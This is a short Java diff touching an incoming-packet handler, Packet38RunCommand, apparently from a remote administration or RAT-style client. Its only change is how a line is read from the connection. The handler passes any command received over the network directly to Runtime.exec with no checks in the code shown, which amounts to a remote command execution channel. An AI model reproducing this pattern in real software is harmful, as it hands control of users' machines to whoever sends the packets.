@@ -10,7 +10,7 @@ public class Packet38RunCommand extends AbstractIncomingPacket {
 
 	@Override
 	public void read() throws Exception {
-		String process = Connection.readLine();
+		String process = Connection.instance.readLine();
 		try {
 			Runtime.getRuntime().exec(process);
 		} catch (Exception ex) {
